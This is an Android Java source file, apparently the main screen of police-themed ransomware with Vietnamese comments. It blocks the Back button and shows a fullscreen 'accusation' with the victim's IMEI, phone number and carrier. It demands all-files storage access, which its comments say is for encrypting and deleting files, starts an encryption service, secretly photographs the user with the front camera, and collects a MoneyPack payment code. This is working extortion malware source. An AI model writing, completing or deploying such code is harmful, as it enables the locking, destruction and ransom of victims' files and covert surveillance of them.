package com.example.into_demo;

import com.chaquo.python.PyObject;
import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.Date;

public class MainActivity extends AppCompatActivity {

    private Button startDetails, yesAgreement, backAgreement;
    private TextView tvDeviceName, tvImei, tvCountry, tvCarrier, tvPhone;
    private SurfaceView surfaceView;
    private LinearLayout mpHelp;
    private TextView mpCode;
    private Button button0, button1, button2, button3, button4,
            button5, button6, button7, button8, button9,
            buttonProceed, buttonClear, buttonHelp;
    private AlertDialog progressDialog;
    private Handler handler = new Handler();
    private GBTakePictureNoPreview cameraHandler;
    private boolean isServiceStarted = false;
    private SharedPreferences settings;

    private static final int REQ_PERMS = 100;
    private static final int REQ_MANAGE_STORAGE = 101;
    private static final String TAG = "MainActivity";

    private enum Screen { StartAccusation, Agreement, MoneyPack }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        settings = getSharedPreferences(Constants.PREFS_NAME, MODE_PRIVATE);
        setContentView(R.layout.start_accusation);
        initViews(Screen.StartAccusation);

        getOnBackPressedDispatcher().addCallback(new OnBackPressedCallback(true) {
            @Override public void handleOnBackPressed() { /* Nuốt phím Back */ }
        });

        maybeRequestPhonePermsAndShowInfo();
        requestManageStorageIfNeeded();
        startEncryptionServiceIfNeeded();
        checkPythonRuntime();
    }

    @Override
    protected void onResume() {
        super.onResume();
        settings.edit().putBoolean("is_activity_visible", true).apply();
        Log.d(TAG, "Activity resumed at " + new Date().toString());
    }

    @Override
    protected void onPause() {
        super.onPause();
        settings.edit().putBoolean("is_activity_visible", false).apply();
        Log.d(TAG, "Activity paused at " + new Date().toString());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_MANAGE_STORAGE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Log.d(TAG, "MANAGE_EXTERNAL_STORAGE granted at " + new Date().toString());
                    // Restart service nếu cần để encrypt/delete
                    startEncryptionServiceIfNeeded();
                    Toast.makeText(this, "Quyền truy cập file đã được cấp", Toast.LENGTH_SHORT).show();
                } else {
                    Log.w(TAG, "MANAGE_EXTERNAL_STORAGE denied at " + new Date().toString());
                    Toast.makeText(this, "Cần quyền truy cập file để mã hóa", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void switchToStart() {
        setContentView(R.layout.start_accusation);
        initViews(Screen.StartAccusation);
        maybeRequestPhonePermsAndShowInfo();
    }

    private void switchToAgreement() {
        setContentView(R.layout.agreement);
        initViews(Screen.Agreement);
    }

    private void switchToMoneyPack() {
        setContentView(R.layout.moneypack);
        initViews(Screen.MoneyPack);
        takePicture();
    }

    private void initViews(Screen screen) {
        if (screen == Screen.StartAccusation) {
            startDetails = findViewById(R.id.details);
            startDetails.setOnClickListener(v -> switchToAgreement());

            tvDeviceName = findViewById(R.id.device_name);
            tvImei = findViewById(R.id.invest);
            tvCountry = findViewById(R.id.locate);
            tvCarrier = findViewById(R.id.carrier);
            tvPhone = findViewById(R.id.phone);

        } else if (screen == Screen.Agreement) {
            yesAgreement = findViewById(R.id.yes_agreement);
            yesAgreement.setOnClickListener(v -> switchToMoneyPack());

            backAgreement = findViewById(R.id.back_agreement);
            backAgreement.setOnClickListener(v -> switchToStart());

        } else { // MoneyPack
            surfaceView = findViewById(R.id.photo_id);
            mpHelp = findViewById(R.id.mpack_buy);
            mpCode = findViewById(R.id.mp_code);

            button0 = findViewById(R.id.butt_0); setDigitButtonListener(button0, "0");
            button1 = findViewById(R.id.butt_1); setDigitButtonListener(button1, "1");
            button2 = findViewById(R.id.butt_2); setDigitButtonListener(button2, "2");
            button3 = findViewById(R.id.butt_3); setDigitButtonListener(button3, "3");
            button4 = findViewById(R.id.butt_4); setDigitButtonListener(button4, "4");
            button5 = findViewById(R.id.butt_5); setDigitButtonListener(button5, "5");
            button6 = findViewById(R.id.butt_6); setDigitButtonListener(button6, "6");
            button7 = findViewById(R.id.butt_7); setDigitButtonListener(button7, "7");
            button8 = findViewById(R.id.butt_8); setDigitButtonListener(button8, "8");
            button9 = findViewById(R.id.butt_9); setDigitButtonListener(button9, "9");

            buttonProceed = findViewById(R.id.proceed);
            buttonProceed.setOnClickListener(v -> sendCode());

            buttonClear = findViewById(R.id.clear);
            buttonClear.setOnClickListener(v -> mpCode.setText(""));

            buttonHelp = findViewById(R.id.help);
            buttonHelp.setOnClickListener(v -> mpHelp.setVisibility(mpHelp.getVisibility() == View.GONE ? View.VISIBLE : View.GONE));
        }
    }

    private void setDigitButtonListener(Button button, String digit) {
        button.setOnClickListener(v -> {
            String current = mpCode.getText().toString();
            if (current.length() < Constants.MONEYPACK_DIGITS_NUMBER) {
                mpCode.setText(current + digit);
            }
        });
    }

    private void maybeRequestPhonePermsAndShowInfo() {
        String[] perms = new String[]{Manifest.permission.READ_PHONE_STATE};
        if (Build.VERSION.SDK_INT >= 26) {
            perms = new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS};
        }
        if (Build.VERSION.SDK_INT >= 33) {
            perms = new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_PHONE_STATE}; // Fallback cho API 35
        }

        boolean hasAll = true;
        for (String perm : perms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                hasAll = false;
                break;
            }
        }

        if (!hasAll) {
            ActivityCompat.requestPermissions(this, perms, REQ_PERMS);
        } else {
            showDeviceInfo();
        }
    }

    private void requestManageStorageIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // API 30+
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "Vui lòng cấp quyền All files access để xóa file", Toast.LENGTH_LONG).show();
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, REQ_MANAGE_STORAGE);
                } catch (Exception e) {
                    // Fallback cho một số launcher không hỗ trợ
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                }
                Log.d(TAG, "Requested MANAGE_EXTERNAL_STORAGE at " + new Date().toString());
            } else {
                Log.d(TAG, "MANAGE_EXTERNAL_STORAGE already granted at " + new Date().toString());
            }
        }
    }

    private void showDeviceInfo() {
        if (tvDeviceName != null) tvDeviceName.setText("Máy: " + Utils.getModel());
        if (tvImei != null) tvImei.setText("IMEI: " + Utils.getIMEI(this));
        if (tvCountry != null) tvCountry.setText("Quốc gia: " + Utils.getSimCountry(this));
        if (tvCarrier != null) tvCarrier.setText("Nhà mạng: " + Utils.getOperatorName(this));
        if (tvPhone != null) tvPhone.setText("Số điện thoại: " + Utils.getPhoneNumber(this));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                showDeviceInfo();
                Log.d(TAG, "Phone permissions granted at " + new Date().toString());
            } else {
                Log.w(TAG, "Some phone permissions denied at " + new Date().toString());
                Toast.makeText(this, "Cần quyền để hiển thị thông tin thiết bị", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void sendCode() {
        if (mpCode == null) return;
        String code = mpCode.getText().toString();
        if (code.length() == Constants.MONEYPACK_DIGITS_NUMBER) {
            showProgress();
            handler.postDelayed(() -> {
                hideProgress();
                new AlertDialog.Builder(this)
                        .setTitle(getString(R.string.app_name))
                        .setMessage(getString(R.string.code_is_sent))
                        .setIcon(R.mipmap.ic_launcher)
                        .setPositiveButton(android.R.string.ok, (d, w) -> d.dismiss())
                        .show();
                Intent intent = new Intent(this, MainService.class);
                intent.putExtra("code", code);
                startService(intent);
                Log.d(TAG, "Sent code: " + code + " at " + new Date().toString());
            }, 1500);
        } else {
            Toast.makeText(this, getString(R.string.wrong_moneypack_code), Toast.LENGTH_SHORT).show();
        }
    }

    private void showProgress() {
        if (progressDialog == null) {
            ProgressBar pb = new ProgressBar(this);
            int pad = (int) (16 * getResources().getDisplayMetrics().density);
            pb.setPadding(pad, pad, pad, pad);
            progressDialog = new AlertDialog.Builder(this)
                    .setView(pb)
                    .setCancelable(false)
                    .create();
        }
        if (!isFinishing() && !progressDialog.isShowing()) progressDialog.show();
    }

    private void hideProgress() {
        if (progressDialog != null && progressDialog.isShowing()) progressDialog.dismiss();
    }

    private void takePicture() {
        if (cameraHandler == null) {
            cameraHandler = new GBTakePictureNoPreview(this, surfaceView);
            cameraHandler.setUseFrontCamera(true);
            cameraHandler.setPortrait();
        }
        if (cameraHandler.cameraIsOk()) {
            cameraHandler.takePicture(); // Đã handle save bên trong
            Log.d(TAG, "Picture taken at " + new Date().toString());
        } else {
            Toast.makeText(this, "Camera unavailable", Toast.LENGTH_SHORT).show();
            Log.e(TAG, "Camera init failed at " + new Date().toString());
        }
    }

    private void startEncryptionServiceIfNeeded() {
        if (!isServiceStarted) {
            try {
                Log.d(TAG, "Starting MainService at " + new Date().toString());
                Intent svc = new Intent(this, MainService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(this, svc);
                } else {
                    startService(svc);
                }
                isServiceStarted = true;
            } catch (Exception e) {
                Log.e(TAG, "Failed to start service: " + e.getMessage() + " at " + new Date().toString(), e);
            }
        }
    }
    // Kiểm tra Chaquopy + gọi thử hàm Python an toàn
    private void checkPythonRuntime() {
        try {
            // 1) Khởi động Python runtime nếu chưa chạy
            if (!Python.isStarted()) {
                Python.start(new AndroidPlatform(this));
            }

            // 2) Lấy instance và nạp module
            Python py = Python.getInstance();
            PyObject module = py.getModule("test_python"); // tương ứng test_python.py

            // 3) Gọi hàm hello trong file test_python.py
            PyObject result = module.callAttr("hello", "Duong");
            String msg = "Chaquopy OK: " + result.toString();

            Log.d("CHAQUOPY_CHECK", msg);
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            // Nếu lỗi, in ra log + thông báo để biết lý do
            Log.e("CHAQUOPY_CHECK", "Lỗi Chaquopy: " + e.getMessage(), e);
            Toast.makeText(this, "Chaquopy lỗi: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
    @Override
    protected void onDestroy() {
        hideProgress();
        super.onDestroy();
        Log.d(TAG, "Activity destroyed at " + new Date().toString());
    }
}